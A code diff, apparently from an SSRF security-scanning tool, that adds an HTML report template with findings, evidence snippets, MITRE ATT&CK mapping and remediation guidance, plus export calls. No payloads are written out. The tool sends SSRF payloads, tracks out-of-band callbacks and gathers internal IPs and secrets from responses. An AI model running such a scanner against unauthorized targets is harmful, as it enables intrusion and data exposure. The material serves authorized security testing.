+<p><strong>Validation status:</strong> {% if vulnerable %}<span class="badge badge-vulnerable">{{status_label}}</span>{% else %}<span class="badge badge-not_confirmed">{{status_label}}</span>{% endif %} <strong>Confidence:</strong> {{report_confidence}}</p>
+</div>
+<div class="card toc"><strong>Sections:</strong> <a href="#executive">Executive Summary</a><a href="#scope">Scope</a><a href="#findings">Validated Findings</a><a href="#evidence">Evidence</a><a href="#mitre">MITRE ATT&CK</a><a href="#remediation">Remediation</a><a href="#attempts">Validation Attempts</a></div>
+<div class="grid">
+<div class="metric"><div class="num">{{attempts|length}}</div><div class="label">Payload attempts</div></div>
+<div class="metric"><div class="num">{{vulnerable_attempts|length}}</div><div class="label">Confirmed attempts</div></div>
+<div class="metric"><div class="num">{{findings}}</div><div class="label">Evidence objects</div></div>
+<div class="metric"><div class="num">{{errors|length}}</div><div class="label">Errors</div></div>
+</div>
+<div class="card" id="executive">
+<h2>Executive Summary</h2>
+{% if vulnerable %}
+<p class="risk">The validation identified evidence consistent with SSRF or sensitive server-side resource access on <strong>{{target}}</strong>. Confirmed evidence is listed below with tested payloads, affected parameters and response snippets.</p>
+{% else %}
+<p class="risk">No SSRF evidence was confirmed during this run. This does not prove the target is safe; it only means the tested payloads did not produce confirmed evidence under the current scan conditions.</p>
+{% endif %}
+<div class="section-note"><strong>Validation note:</strong> This report is intended for security team review. Reproduce confirmed items manually before remediation closure, and avoid sharing raw reports publicly if response snippets contain secrets, internal IPs or tokens.</div>
+</div>
+<div class="card" id="scope">
+<h2>Scope and Environment</h2>
+<table><tr><th>Item</th><th>Value</th></tr><tr><td>Target</td><td>{{target}}</td></tr><tr><td>Base URL</td><td>{{base}}</td></tr><tr><td>WAF</td><td>{{waf}}</td></tr><tr><td>Cloud signals</td><td>{{cloud}}</td></tr><tr><td>Endpoints discovered</td><td>{{endpoints}}</td></tr><tr><td>Callbacks observed</td><td>{{callbacks}}</td></tr><tr><td>Custom payloads</td><td>{{custom_payloads|join(', ') if custom_payloads else 'None'}}</td></tr></table>
+</div>
+<div class="card" id="findings">
+<h2>Validated Findings</h2>
+{% if vulns %}
+<table><tr><th>Severity</th><th>Endpoint</th><th>Parameter</th><th>Evidence Count</th><th>OAST Hits</th><th>Representative Payloads</th></tr>{% for v in vulns %}<tr><td><span class="badge badge-{{v.severity}}">{{v.severity.upper()}}</span></td><td>{{v.endpoint}}</td><td>{{v.param}}</td><td>{{v.count}}</td><td>{{v.oob}}</td><td>{% for s in v.samples %}<code>{{s.payload}}</code>{% if not loop.last %}<br>{% endif %}{% endfor %}</td></tr>{% endfor %}</table>
+{% else %}
+<p class="muted">No confirmed findings were produced by this run.</p>
+{% endif %}
+</div>
+<div class="card" id="evidence">
+<h2>Evidence Details</h2>
+{% if evidence_items %}
+{% for ev in evidence_items %}
+<h3><span class="badge badge-{{ev.severity}}">{{ev.severity.upper()}}</span> {{ev.endpoint}} via {{ev.param}}</h3>
+<table><tr><th>Field</th><th>Value</th></tr><tr><td>URL</td><td><code>{{ev.url}}</code></td></tr><tr><td>Payload</td><td><code>{{ev.payload}}</code></td></tr><tr><td>Status</td><td>{{ev.status}}</td></tr><tr><td>Matched patterns</td><td>{{ev.matched_patterns|join(', ')}}</td></tr><tr><td>Out-of-band callback</td><td>{{ev.out_of_band_hit}}</td></tr><tr><td>Impact score</td><td>{{ev.impact_score}}</td></tr></table>
+<p><strong>Response snippet:</strong></p><pre class="code">{{ev.body_snippet}}</pre>
+{% endfor %}
+{% else %}
+<p class="muted">No confirmed evidence snippets were collected.</p>
+{% endif %}
+</div>
+<div class="card" id="mitre">
+<h2>MITRE ATT&CK Mapping</h2>
+<table><tr><th>Technique</th><th>Tactic</th><th>Why it applies</th><th>Atomic Red Team Reference</th></tr>{% for tech in mitre_report.summary.techniques %}<tr><td><strong>{{tech.id}}</strong><br>{{tech.technique}}</td><td>{{tech.tactic}}</td><td>{{tech.reason}}</td><td><code>{{tech.atomic_red_team_path}}</code></td></tr>{% endfor %}</table>
+</div>
+<div class="card" id="remediation">
+<h2>Remediation Guidance</h2>
+<table><tr><th>Priority</th><th>Category</th><th>Recommendation</th><th>Implementation Notes</th></tr>{% for item in remediation_flat %}<tr><td><span class="badge badge-{{item.priority|lower}}">{{item.priority}}</span></td><td>{{item.category}}</td><td>{{item.recommendation}}</td><td>{{item.details}}</td></tr>{% endfor %}</table>
+</div>
+<div class="card">
+<h2>Validation and Retest Checklist</h2>
+<ul><li>Confirm each affected endpoint only accepts approved URL schemes and destinations.</li><li>Block link-local metadata IPs, localhost, private RFC1918 ranges and internal service names unless explicitly required.</li><li>Use allowlisted destinations instead of blocklists where possible.</li><li>Disable redirects or re-validate the final resolved destination after redirects.</li><li>Add network egress controls for the application runtime.</li><li>Remove sensitive secrets from files reachable by server-side fetch functionality.</li><li>Retest the exact payloads listed in the Evidence Details section.</li></ul>
+</div>
+<div class="card" id="attempts">
+<h2>Validation Attempts</h2>
+<table><tr><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Payload</th><th>Evidence / Error</th><th>Response Snippet</th></tr>{% for a in attempts %}<tr><td><span class="badge badge-{{a.result}}">{{a.result}}</span></td><td>{{a.status}}</td><td>{{a.endpoint}}</td><td>{{a.param}}</td><td><code>{{a.payload}}</code></td><td>{% if a.matched_patterns %}{{a.matched_patterns|join(', ')}}{% elif a.error %}{{a.error}}{% else %}No SSRF evidence confirmed for this payload.{% endif %}</td><td><pre class="code">{{a.body_snippet}}</pre></td></tr>{% endfor %}</table>
+</div>
+<div class="card">
+<h2>AI Suggested Safe Checks</h2>
+{% if other_issue_attempts %}
+<table><tr><th>Issue Type</th><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Evidence / Reason</th></tr>{% for item in other_issue_attempts %}<tr><td>{{item.issue_type}}</td><td><span class="badge badge-{{item.result}}">{{item.result}}</span></td><td>{{item.status}}</td><td>{{item.endpoint}}</td><td>{{item.param}}</td><td>{% if item.evidence %}{{item.evidence|join(', ')}}{% else %}{{item.reason}}</td>{% endif %}</tr>{% endfor %}</table>
+{% else %}<p class="muted">No AI suggested checks were recorded.</p>{% endif %}
+</div>
+<div class="footer">Generated for authorized security validation. Review and redact sensitive data before sharing.</div>
+</div>
 </body>
 </html>
-        """).render(target=self.target, date=datetime.now().strftime("%Y-%m-%d %H:%M"), waf=self.waf_info.get("primary", "N/A") if self.waf_info else "N/A", cloud=", ".join(self.cloud) if self.cloud else "Unknown", endpoints=len(self.endpoints), findings=len(self.evidence), unique=len(deduped), callbacks=len(self.callbacks), vulns=vulns, attempts=attempts, vulnerable=vulnerable, errors=errors, not_confirmed=not_confirmed, other_issue_attempts=self.other_issue_attempts)
+        """).render(
+            target=self.target,
+            base=self.base,
+            date=datetime.now().strftime("%Y-%m-%d %H:%M"),
+            waf=self.waf_info.get("primary", "N/A") if self.waf_info else "N/A",
+            cloud=", ".join(self.cloud) if self.cloud else "Unknown",
+            endpoints=len(self.endpoints),
+            findings=len(self.evidence),
+            unique=len(deduped),
+            callbacks=len(self.callbacks),
+            vulns=vulns,
+            attempts=attempts,
+            vulnerable_attempts=vulnerable_attempts,
+            vulnerable=vulnerable,
+            errors=errors,
+            not_confirmed=not_confirmed,
+            suspected=suspected,
+            evidence_items=evidence_items,
+            other_issue_attempts=self.other_issue_attempts,
+            mitre_report=mitre_report,
+            remediation_flat=remediation_flat,
+            status_label=status_label,
+            report_confidence=report_confidence,
+            custom_payloads=self.custom_payloads,
+        )
         with open(self.html_file, "w", encoding="utf-8") as f:
             f.write(html)
         if self.verbose:
-            print(f"  {OK} HTML report: {self.html_file}")
+            print(f"  {OK} Security validation HTML report: {self.html_file}")
 
     async def save_json(self):
         vulnerable = any(attempt.vulnerable for attempt in self.scan_attempts) or bool(self.evidence)
@@ -1521,7 +1993,8 @@ body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}.header{backgr
             "callbacks": dict(self.callbacks),
             "internal_ips": list(self.internal_ips),
             "ai_suggestions": self.ai_suggestions,
-            "other_issue_attempts": self.other_issue_attempts
+            "other_issue_attempts": self.other_issue_attempts,
+            "mitre_attack": self.build_mitre_report()
         }
         with open(self.json_file, "w", encoding="utf-8") as f:
             json.dump(data, f, indent=2, ensure_ascii=False, default=str)
@@ -1547,6 +2020,9 @@ body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}.header{backgr
             print(f"  {col}[{sev.upper()}]{RESET} {ep} → {param} ({info['oob']} callbacks)")
         print(f"\n  {DIM}Report: {self.html_file}{RESET}")
         print(f"  {DIM}Results: {self.json_file}{RESET}")
+        if self.do_export_mitre:
+            print(f"  {DIM}MITRE: {self.output_dir / ('mitre_attack_' + self._safe_target_name() + '.json')}{RESET}")
+            print(f"  {DIM}Remediation: {self.output_dir / ('remediation_' + self._safe_target_name() + '.md')}{RESET}")
 
     async def run(self):
         print(f"\n{BOLD}{'='*50}{RESET}\n{BOLD}Target:{RESET} {self.target}\n{BOLD}Callback:{RESET} {self.cb}")
@@ -1571,6 +2047,7 @@ body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}.header{backgr
                 self.export_siem_cef()
                 self.export_json_api()
                 self.generate_attack_map()
+                self.export_mitre_attack()
                 await self.generate_html()
                 await self.save_json()
                 self.print_summary()
@@ -1599,6 +2076,7 @@ body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}.header{backgr
             self.export_siem_cef()
             self.export_json_api()
             self.generate_attack_map()
+            self.export_mitre_attack()
             await self.generate_html()
             await self.save_json()
             self.print_summary()
